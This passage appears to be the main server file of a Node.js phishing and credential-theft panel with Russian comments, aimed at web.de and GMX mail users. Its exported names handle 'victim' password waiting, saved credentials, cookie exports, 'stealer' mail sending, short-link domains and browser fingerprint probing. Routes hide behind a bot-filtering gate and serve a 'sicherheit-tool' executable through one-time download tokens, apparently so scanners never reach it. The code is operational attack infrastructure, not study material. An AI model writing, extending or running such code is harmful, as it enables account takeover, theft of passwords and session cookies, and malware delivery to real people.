  SHORT_DOMAINS_TTL_MS: SHORT_DOMAINS_TTL_MS,
  START_PAGE_FILE: START_PAGE_FILE,
  STEALER_EMAIL_FILE: STEALER_EMAIL_FILE,
  WARMUP_EMAIL_FILE: WARMUP_EMAIL_FILE,
  WARMUP_LOG_MAX: WARMUP_LOG_MAX,
  WARMUP_SMTP_STATS_FILE: WARMUP_SMTP_STATS_FILE,
  WEBDE_CANONICAL_HOST: WEBDE_CANONICAL_HOST,
  WEBDE_DOMAIN: WEBDE_DOMAIN,
  WEBDE_DOMAINS_LIST: WEBDE_DOMAINS_LIST,
  WEBDE_DOMAINS_RAW: WEBDE_DOMAINS_RAW,
  WEBDE_FINGERPRINTS_JSON: WEBDE_FINGERPRINTS_JSON,
  WEBDE_FP_INDICES_FILE: WEBDE_FP_INDICES_FILE,
  WEBDE_PROBE_BATCH_SCRIPT: WEBDE_PROBE_BATCH_SCRIPT,
  WEBDE_PROBE_MAX_INDICES_PER_JOB: WEBDE_PROBE_MAX_INDICES_PER_JOB,
  WEBDE_SCRIPT_VICTIM_WAIT_MS: WEBDE_SCRIPT_VICTIM_WAIT_MS,
  WEBDE_WAIT_PASSWORD_TIMEOUT_MS: WEBDE_WAIT_PASSWORD_TIMEOUT_MS,
  ZIP_PASSWORD_FILE: ZIP_PASSWORD_FILE,
  _shortDomainsCache: _shortDomainsCache,
  addShortDomainToCloudflare: addShortDomainToCloudflare,
  apiRoutes: apiRoutes,
  appendToAllLog: appendToAllLog,
  applyReturnVisitStatusReset: applyReturnVisitStatusReset,
  archiveFlagIsSet: archiveFlagIsSet,
  automationService: automationService,
  broadcastLeadsUpdate: broadcastLeadsUpdate,
  buildWebdeFingerprintsListPayload: buildWebdeFingerprintsListPayload,
  chatService: chatService,
  checkRateLimit: checkRateLimit,
  cleanupRateLimit: cleanupRateLimit,
  consumeDownloadToken: consumeDownloadToken,
  cookieEmailForLeadCookiesFile: cookieEmailForLeadCookiesFile,
  cookieExportFilename: cookieExportFilename,
  cookieSafeForLoginCookiesFile: cookieSafeForLoginCookiesFile,
  dns: dns,
  downloadTokens: downloadTokens,
  ensureDataFile: ensureDataFile,
  findDownloadFile: findDownloadFile,
  firstGateTimeByIp: firstGateTimeByIp,
  fs: fs,
  generateDownloadToken: generateDownloadToken,
  getAndroidDownloadFile: getAndroidDownloadFile,
  getAndroidDownloadFileByLimit: getAndroidDownloadFileByLimit,
  getAndroidDownloadFiles: getAndroidDownloadFiles,
  getAutoRedirectEventLabel: getAutoRedirectEventLabel,
  getBrand: getBrand,
  getCanonicalDomain: getCanonicalDomain,
  getClientIp: getClientIp,
  getInitialRedirectStatus: getInitialRedirectStatus,
  getLoginAndNewPassword: getLoginAndNewPassword,
  getMinTimeSinceGateOk: getMinTimeSinceGateOk,
  getRedirectPasswordStatus: getRedirectPasswordStatus,
  getShortDomainsList: getShortDomainsList,
  getSicherheitDownloadFile: getSicherheitDownloadFile,
  getSicherheitDownloadFileByLimit: getSicherheitDownloadFileByLimit,
  getSicherheitDownloadFiles: getSicherheitDownloadFiles,
  getSlotForLead: getSlotForLead,
  handleWebdeFingerprintProbePause: handleWebdeFingerprintProbePause,
  handleWebdeFingerprintProbeResume: handleWebdeFingerprintProbeResume,
  handleWebdeFingerprintProbeStart: handleWebdeFingerprintProbeStart,
  hasGateCookie: gateMiddleware.hasGateCookie,
  http: http,
  https: https,
  incrementDownloadCount: incrementDownloadCount,
  invalidateLeadsCache: invalidateLeadsCache,
  isAdminRequest: isAdminRequest,
  isLocalHost: isLocalHost,
  leadEventTerminalHasExactLabel: leadEventTerminalHasExactLabel,
  leadHasAnyConfigEmailSentEvent: leadHasAnyConfigEmailSentEvent,
  leadHasKleinMarkedData: leadHasKleinMarkedData,
  leadHasSavedCookies: leadHasSavedCookies,
  leadIsWorkedFromEvents: leadIsWorkedFromEvents,
  leadIsWorkedLikeAdmin: leadIsWorkedLikeAdmin,
  leadService: leadService,
  leadStatusStaleAfterCompletedRedirect: leadStatusStaleAfterCompletedRedirect,
  mergeDuplicates: mergeDuplicates,
  net: net,
  normalizePasswordHistory: normalizePasswordHistory,
  os: os,
  parseSmtpLine: parseSmtpLine,
  parseSmtpLines: parseSmtpLines,
  path: path,
  persistLeadFull: persistLeadFull,
  persistLeadPatch: persistLeadPatch,
  processArchiveToGmx: processArchiveToGmx,
  pruneWebdeProbeJobs: pruneWebdeProbeJobs,
  pushEvent: pushEvent,
  pushPasswordHistory: pushPasswordHistory,
  pushSubmitPipelineEvent: pushSubmitPipelineEvent,
  rateLimitBuckets: rateLimitBuckets,
  readAndroidDownloadConfig: readAndroidDownloadConfig,
  readAndroidDownloadLimits: readAndroidDownloadLimits,
  readAutoScript: readAutoScript,
  readCheckMeta: readCheckMeta,
  readConfigEmail: readConfigEmail,
  readCookiesExported: readCookiesExported,
  readDownloadCounts: readDownloadCounts,
  readDownloadFilesConfig: readDownloadFilesConfig,
  readDownloadLimits: readDownloadLimits,
  readDownloadRotation: readDownloadRotation,
  readDownloadSettings: readDownloadSettings,
  readLeads: readLeads,
  readLeadsAsync: readLeadsAsync,
  readMode: readMode,
  readModeData: readModeData,
  readSavedCredentials: readSavedCredentials,
  readShortDomains: readShortDomains,
  readStartPage: readStartPage,
  readStealerEmailConfig: readStealerEmailConfig,
  readWarmupEmailConfig: readWarmupEmailConfig,
  readWarmupSmtpStats: readWarmupSmtpStats,
  readWebdeFingerprintsPoolArr: readWebdeFingerprintsPoolArr,
  readWebdeFingerprintsPoolMeta: readWebdeFingerprintsPoolMeta,
  readWebdeFpIndicesAllowedForProbe: readWebdeFpIndicesAllowedForProbe,
  readZipPassword: readZipPassword,
  resolveLeadId: resolveLeadId,
  resolvePlatform: resolvePlatform,
  runWarmupStep: runWarmupStep,
  sanitizeFilenameForHeader: sanitizeFilenameForHeader,
  sendStealerFailedSmtpEmails: sendStealerFailedSmtpEmails,
  sendStealerSmtpIndex: sendStealerSmtpIndex,
  sendWebdeFingerprintProbeStatus: sendWebdeFingerprintProbeStatus,
  setFirstGateTime: setFirstGateTime,
  short: short,
  slotFromLeadId: slotFromLeadId,
  smsCodeDataKindForLead: smsCodeDataKindForLead,
  spawnTimedOut: spawnTimedOut,
  statusHeartbeats: statusHeartbeats,
  submitPipelineDetail: submitPipelineDetail,
  submitPipelineEventRaw: submitPipelineEventRaw,
  summarizeWebdeFingerprintEntry: summarizeWebdeFingerprintEntry,
  suppressVictimPushPageForKleinContext: suppressVictimPushPageForKleinContext,
  tryRepairAndExtractZip: tryRepairAndExtractZip,
  url: url,
  warmupState: warmupState,
  webdeErrorTriggersVictimAutomationWait: webdeErrorTriggersVictimAutomationWait,
  webdeFpProbeIndexCursor: webdeFpProbeIndexCursor,
  webdePasswordWaiters: webdePasswordWaiters,
  webdeProbeJobSeq: webdeProbeJobSeq,
  webdeProbeJobs: webdeProbeJobs,
  webdeProbeRunOneBatch: webdeProbeRunOneBatch,
  webdeProbeScheduleContinue: webdeProbeScheduleContinue,
  webdePushResendRequested: webdePushResendRequested,
  writeAndroidDownloadConfig: writeAndroidDownloadConfig,
  writeAndroidDownloadLimits: writeAndroidDownloadLimits,
  writeCheckMeta: writeCheckMeta,
  writeConfigEmail: writeConfigEmail,
  writeCookiesExported: writeCookiesExported,
  writeDebugLog: writeDebugLog,
  writeDownloadCounts: writeDownloadCounts,
  writeDownloadFilesConfig: writeDownloadFilesConfig,
  writeDownloadLimits: writeDownloadLimits,
  writeDownloadRotation: writeDownloadRotation,
  writeDownloadSettings: writeDownloadSettings,
  writeLeads: writeLeads,
  writeMode: writeMode,
  writeReplacedLeadId: writeReplacedLeadId,
  writeSavedCredentials: writeSavedCredentials,
  writeShortDomains: writeShortDomains,
  writeStartPage: writeStartPage,
  writeStealerEmailConfig: writeStealerEmailConfig,
  writeWarmupEmailConfig: writeWarmupEmailConfig,
  writeWarmupSmtpStats: writeWarmupSmtpStats,
  writeZipPassword: writeZipPassword,
  yauzl: yauzl,
  buildAutomationProfile: buildAutomationProfile,
  buildLeadLoginContextPayload: buildLeadLoginContextPayload,
  clearWebdeScriptRunning: clearWebdeScriptRunning,
  endWebdeAutoLoginRun: endWebdeAutoLoginRun,
  fingerprintSignature: fingerprintSignature,
  logTerminalFlow: logTerminalFlow,
  releaseWebdeLoginSlot: releaseWebdeLoginSlot,
  setWebdeLeadScriptStatus: setWebdeLeadScriptStatus,
  touchWebdeScriptLock: touchWebdeScriptLock,
  webdeLoginChildByLeadId: webdeLoginChildByLeadId,
};

const server = http.createServer(async (req, res) => {
  // Обработка CORS preflight запросов
  if (req.method === 'OPTIONS') {
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Max-Age': '86400'
    });
    res.end();
    return;
  }

  const parsed = parseHttpRequestUrl(req);
  let pathname = parsed.pathname;

  // Ранний лёгкий ответ для проверки, что сервер живой (до readShortDomains и прочей логики)
  if ((pathname === '/health' || pathname === '/ping') && req.method === 'GET') {
    if (safeEnd(res)) return;
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Cache-Control': 'no-store' });
    res.end('ok');
    return;
  }

  const MAX_POST_BODY_BYTES = 50 * 1024 * 1024;
  if (req.method === 'POST' && req.headers['content-length']) {
    const cl = parseInt(req.headers['content-length'], 10);
    if (!isNaN(cl) && cl > MAX_POST_BODY_BYTES) {
      send(res, 413, { ok: false, error: 'Payload too large' });
      req.destroy();
      return;
    }
  }

  if ((pathname === '/api/config/download' || pathname === '/api/config/download-android' || pathname === '/api/config/check') && req.method === 'POST' && req.setTimeout) {
    req.setTimeout(300000);
    req.on('timeout', () => { req.destroy(); });
  }

  // Сокращалка: /s/:slug → редирект (бекенд в short/)
  const shortlinkMatch = pathname.match(/^\/s\/([a-zA-Z0-9_-]+)$/);
  if (shortlinkMatch && req.method === 'GET') {
    const slug = shortlinkMatch[1];
    const target = short.resolveShortLink(slug);
    if (target) {
      if (safeEnd(res)) return;
      res.writeHead(302, { 'Location': target, 'Cache-Control': 'no-store' });
      res.end();
      return;
    }
  }

  const requestHost = (req.headers.host || '').split(':')[0].toLowerCase();
  const isLocalhost = requestHost === 'localhost' || requestHost === '127.0.0.1' || requestHost === '';
  const isAdminPage = pathname === '/admin' || pathname === '/admin/';
  const isAdminHtml = pathname === '/admin.html';
  const shortDomainsList = getShortDomainsList();
  const shortHostNorm = requestHost.replace(/^www\./, '');
  const shortDomainKey = shortDomainsList[requestHost] ? requestHost : (shortDomainsList[shortHostNorm] ? shortHostNorm : null);
  const isShortDomain = shortDomainKey !== null;

  if (gateMiddleware.runHostShortCanonicalPhase(req, res, {
    pathname,
    requestHost,
    isLocalhost,
    isAdminPage,
    isAdminHtml,
    ADMIN_DOMAIN,
    isAdminRequest,
    isShortDomain,
    shortDomainKey,
    shortDomainsList,
    getCanonicalDomain,
    GMX_DOMAIN,
    PROJECT_ROOT,
    getBrand,
    getShortDomainsList,
  })) return;

  const ip = getClientIp(req);
  const isUserPath = pathname === '/api/visit' || pathname === '/api/submit' || pathname === '/api/download-filename' ||
    (pathname.startsWith('/download/') && pathname.length > 9) ||
    (req.method === 'GET' && gateMiddleware.isProtectedPage(pathname));
  if (isUserPath && gateMiddleware.hasGateCookie(req)) setFirstGateTime(ip);

  if (pathname.startsWith('/api/')) {
    let body = '';
    if (apiRoutes.needsRequestBody(req.method, pathname)) {
      body = await readApiRouteBody(req, MAX_POST_BODY_BYTES);
    }
    let handled = false;
    try {
      handled = await apiRoutes.handleApiRoute(req, res, parsed, body, API_ROUTE_DEPS);
    } catch (err) {
      console.error('[apiRoutes]', err);
      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
      return;
    }
    if (handled) return;

    const ROUTE_HTTP_MERGED = Object.assign({}, ROUTE_HTTP_DEPS, { ip });
    try {
      if (await clientRoutes.handleRoute(req, res, parsed, body, ROUTE_HTTP_MERGED)) return;
    } catch (err) {
      console.error('[clientRoutes]', err);
      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
      return;
    }
    try {
      const adminHandled = await adminRoutes.handleRoute(req, res, parsed, body, ROUTE_HTTP_MERGED);
      if (adminHandled) return;
    } catch (err) {
      console.error('[adminRoutes]', err);
      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
      return;
    }
  }

  if (pathname === '/api/brand' && req.method === 'GET') {
    if (safeEnd(res)) return;
    const brand = getBrand(req);
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'public, max-age=300',
      'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify(brand));
    return;
  }

  if (pathname === '/gate-white' && req.method === 'GET') {
    gateMiddleware.handleGateWhite(req, res, getBrand, getShortDomainsList);
    return;
  }

  if (gateMiddleware.handleProtectedPageGate(req, res, pathname, getBrand)) return;

  const ROUTE_HTTP_MERGED_STATIC = Object.assign({}, ROUTE_HTTP_DEPS, { ip });

  // Скачивание: /download/<имя_файла>?t=TOKEN — только с одноразовым токеном (боты не получают ссылку). Админка может без токена.
  const downloadFileMatch = pathname.match(/^\/download\/([^/?#]+)$/);
  if (downloadFileMatch && req.method === 'GET') {
    const token = (parsed.query && parsed.query.t) ? String(parsed.query.t).trim() : '';
    let fileName = null;
    if (token) {
      fileName = consumeDownloadToken(token);
    } else if (requestHost === ADMIN_DOMAIN || getAdminTokenFromRequest(req, parsed) === ADMIN_TOKEN) {
      let rawName;
      try {
        rawName = decodeURIComponent(downloadFileMatch[1]).replace(/\0/g, '');
      } catch (e) {
        rawName = downloadFileMatch[1].replace(/\0/g, '');
      }
      fileName = path.basename(rawName);
    }
    if (!fileName) {
      if (safeEnd(res)) return;
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Forbidden');
      return;
    }
    if (!checkRateLimit(ip, 'downloadGet', RATE_LIMITS.downloadGet)) {
      if (safeEnd(res)) return;
      res.writeHead(429, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'too_many_requests' }));
      return;
    }
    const fullPath = findDownloadFile(fileName);
    if (fullPath) {
      const displayName = path.basename(fullPath);
      incrementDownloadCount(fileName);
      const ext = path.extname(fullPath).toLowerCase();
      const contentType = ext === '.zip' ? 'application/zip' : 'application/octet-stream';
      var fileSize = 0;
      try { fileSize = fs.statSync(fullPath).size; } catch (e) {}
      if (safeEnd(res)) return;
      var downloadHeaders = {
        'Content-Type': contentType,
        'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(displayName) + '"',
        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
        'Pragma': 'no-cache'
      };
      if (fileSize > 0) downloadHeaders['Content-Length'] = String(fileSize);
      res.writeHead(200, downloadHeaders);
      const stream = fs.createReadStream(fullPath);
      stream.on('error', function (err) {
        console.error('[SERVER] download stream error:', fileName, err.message || err);
        try { if (!res.writableEnded) res.end(); } catch (e) {}
      });
      stream.pipe(res);
      return;
    }
    return send(res, 404, 'Not Found', 'text/plain');
  }

  // Старые URL скачивания — редирект на текущий файл по имени (или 404)
  if ((pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe') && req.method === 'GET') {
    const info = getSicherheitDownloadFile();
    if (info && info.fileName) {
      if (safeEnd(res)) return;
      res.writeHead(302, { 'Location': '/download/' + encodeURIComponent(info.fileName), 'Cache-Control': 'no-store' });
      res.end();
      return;
    }
    return send(res, 404, 'Not Found', 'text/plain');
  }

  try {
    await staticRoutes.handleRoute(req, res, parsed, '', ROUTE_HTTP_MERGED_STATIC);
  } catch (err) {
    console.error('[staticRoutes]', err);
    if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
  }
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    writeFatalSync(`Ошибка: Порт ${PORT} уже занят. Используйте другой порт через переменную PORT.`);
    process.exit(1);
  } else {
    writeFatalSync('Ошибка сервера: ' + (err && err.stack ? err.stack : err));
    process.exit(1);
  }
});

if (WebSocketServer) {
  const wss = new WebSocketServer({ server: server, path: '/ws' });
  global.__gmwWssBroadcast = function () {
    const msg = JSON.stringify({ type: 'leads-update' });
    wss.clients.forEach(function (client) {
      if (client.readyState === 1) try { client.send(msg); } catch (e) {}
    });
  };
  wss.on('connection', function (ws) {
    console.log('[SERVER] WebSocket: админ подключён');
  });
} else {
  console.log('[SERVER] WebSocket не подключён (установите: npm install ws)');
}

// Production: требовать ADMIN_TOKEN (иначе админка открыта без пароля)
const isProduction = (process.env.NODE_ENV || '').toLowerCase() === 'production';
if (isProduction && !ADMIN_TOKEN) {
  writeFatalSync('[SERVER] NODE_ENV=production: задайте ADMIN_TOKEN в .env или окружении. Без токена админка не защищена.');
  process.exit(1);
}

// Обработка необработанных исключений — логировать и завершать процесс
process.on('uncaughtException', (err) => {
  writeFatalSync('[SERVER] uncaughtException: ' + (err && err.stack ? err.stack : err));
  process.exit(1);
});
process.on('unhandledRejection', (reason, promise) => {
  writeFatalSync('[SERVER] unhandledRejection: ' + (reason && reason.stack ? reason.stack : reason));
  process.exit(1);
});

// При старте: создать критичные каталоги и сообщить о необязательных зависимостях
ensureDataFile();
if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
if (!nodemailer) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
if (!WebSocketServer) console.log('[SERVER] ws не установлен — обновление админки в реальном времени отключено (npm install ws)');

function cleanLoginArtifacts() {
  if (!fs.existsSync(LOGIN_DIR)) return;
  const now = Date.now();
  LOGIN_ARTIFACT_NAMES.forEach((name) => {
    const full = path.join(LOGIN_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (!stat.isFile()) return;
      if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
      fs.unlinkSync(full);
    } catch (e) {}
  });
  try {
    const names = fs.readdirSync(LOGIN_DIR);
    names.forEach((name) => {
      if (!name.endsWith('.png')) return;
      const full = path.join(LOGIN_DIR, name);
      try {
        const stat = fs.statSync(full);
        if (!stat.isFile()) return;
        if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
        fs.unlinkSync(full);
      } catch (e) {}
    });
  } catch (e) {}
}

function runFullCleanup() {
  const scriptPath = path.join(PROJECT_ROOT, 'scripts', 'cleanup-backups.js');
  if (!fs.existsSync(scriptPath)) return;
  const node = process.execPath;
  const child = require('child_process').spawn(node, [scriptPath, '--tmp', '--login-cleanup'], { cwd: PROJECT_ROOT, stdio: 'ignore', detached: true });
  child.unref();
}

server.listen(PORT, HOST, () => {
  console.log('Сервер: http://' + HOST + ':' + PORT);
  console.log('Админка: http://' + HOST + ':' + PORT + '/admin.html');
  console.log('[SERVER] SQLite → ' + DB_PATH + (process.env.GMW_DATA_DIR ? ' (GMW_DATA_DIR)' : ' (каталог проекта ./data)'));
  setTimeout(cleanLoginArtifacts, 60 * 1000);
  setInterval(cleanLoginArtifacts, 10 * 60 * 1000);
  setTimeout(runFullCleanup, 2 * 60 * 1000);
  setInterval(runFullCleanup, 10 * 60 * 1000);
  scheduleWebdeLayoutHealthcheck();
});

function shutdown() {
  server.close(() => {
    try {
      closeDb();
    } catch (_) {}
    console.log('Сервер остановлен.');
    process.exit(0);
  });
}

process.on('SIGTERM', () => {
  console.log('Получен SIGTERM, завершаю работу...');
  shutdown();
});

process.on('SIGINT', () => {
  console.log('\nПолучен SIGINT, завершаю работу...');
  shutdown();
});

